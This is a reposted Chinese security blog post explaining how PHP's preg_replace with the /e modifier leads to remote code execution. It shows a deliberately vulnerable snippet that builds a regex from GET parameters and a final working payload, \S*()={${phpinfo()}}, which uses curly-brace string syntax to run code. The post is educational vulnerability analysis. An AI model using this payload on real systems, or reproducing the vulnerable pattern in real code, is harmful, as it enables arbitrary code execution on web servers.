## 一个有趣的preg_replace函数

来源：[http://www.lmxspace.com/2018/08/12/一个有趣的preg-replace函数/](http://www.lmxspace.com/2018/08/12/一个有趣的preg-replace函数/)

时间 2018-08-12 18:22:14

 
事情的起因是下午遇到了 **`preg_replace`**  函数，我们都知道 **`preg_replace`**  函数可能会导致命令执行。现在我们来一些情况。
 
## 0x02 经过 
 
## 踩坑1: 
 
测试代码大概是这样的：
 
  
   
```php
foreach ($_GET as $regex => $value) {
    preg_replace('/(' . $regex . ')/ei','strtolower("\\1")',$value);
}
```

测试过程中发现通过浏览器的方式传入数据的时候，会将 **`.`**  **`+`**  等特殊字符转换为 **`_`**  。
 
![][0]
 
![][1]
 
这里涉及到了php的一个特性
 
php自身在解析请求的时候，如果参数名字中包含空格、`.`、`[`等字符，会将他们转换成`_`。
 
  
   
```php
<?php
$a = $_GET;
var_dump($a);
?>
```

![][2]
 
经过我的fuzz，结果如下图：
 
![][3]
 
## 踩坑2： 
 
那我们知道 **`preg_replace`**  的 **`/e`**  修正符会将 **`replacement`**  参数当作 **`php`**  代码，并且以 **`eval`**  函数的方式执行，前提是 **`subject`**  中有 **`pattern`**  的匹配。既然是这样我们看一张图。
 
![][4]
 
图中实际上通过 **`eval`**  执行的是 **`strtolower`**  函数。分别实际执行的是：
 
  
   
```php
strtolower("JUST TEST");
strtolower("PHPINFO()");
strtolower("{${PHPINFO()}}");
```

第三个之所以可以执行代码，是因为我们通过 [复杂（花括号）语法][7] 的方式来让其代码执行。
 
## 踩坑3: 
 
回到源代码中，我们再理解一下：
 
  
   
```php
foreach ($_GET as $regex => $value) {
    preg_replace('/(' . $regex . ')/ei','strtolower("\\1")',$value);
}
```

这里的 **`replacement`**  是 **`strtolower(“\\1”)`**  ，着重理解一下 **`\\1`**  。
 
每个这样的引用将被匹配到的第n个捕获子组捕获到的文本替换。 n可以是0-99，\0和\$0代表完整的模式匹配文本。
 
假设一个正则表达式是这样的：
 
  
   
```php
preg_replace('/(.*)(\?|&)' . $key . '=[^&]+?(&)(.*)/i', '$1$2$4', $url . '&');
```

这里的 **`\$1\$2\$4`**  等同于上面的 **`\1\2\4`**  的作用，因此我们看一下是怎么选择匹配的。
 
  
   
```
      $1   $2                      $3 $4
'/(.*)(\?|&)' . $key . '=[^&]+?(&)(.*)/i'
```

## 0x03 解决 
 
好了上面都已经铺垫完坑了，这里要开始解决了。
 
  
   
```php
foreach ($_GET as $regex => $value) {
    preg_replace('/(' . $regex . ')/ei','strtolower("\\1")',$value);
}
```

我们想要让这部分代码达到代码执行的效果需要达到几个条件：
 
 
* **`pattern`**  部分的表达式需要命中 **`\$value`**  中的数据  
* **`\1`**  中取出的数据 [复杂（花括号）语法][7] 的特征，来保证在双引号的包含下达到代码执行的效果  
* 由于php的特性url会将 **`.`**  、 **`[`**  、 **`+`**  等特殊字符转换为 **`_`**  。  
 
 
我们知道这里是通过 **`get`**  方式获取到 **`\$regex`**  和 **`\$value`**  的，要想在 **`replacement`**  部分通过 **`\1`**  截取到 **`pattern`**  正则匹配命中 **`\$value`**  中的数据，并且携带 **`\$`**  、 **`{`**  、 **`(`**  这里就涉及到正则表达式的使用了。
 
这里我选择了 **`\S`**  ，也就是匹配任意的非空白字符，那么最后的payload长这样
 
  
   
```
\S*()={${phpinfo()}}
```

![][5]
 
![][6]
 


[7]: http://php.net/manual/zh/language.types.string.php#language.types.string.parsing.complex
[8]: http://php.net/manual/zh/language.types.string.php#language.types.string.parsing.complex
[0]: ../img/22amAvi.png
[1]: ../img/UfEZR32.png
[2]: ../img/6fmyMfq.png
[3]: ../img/vuyEVrz.png
[4]: ../img/vAFf6nn.png
[5]: ../img/bQJNfuY.png
[6]: ../img/iInaiu3.png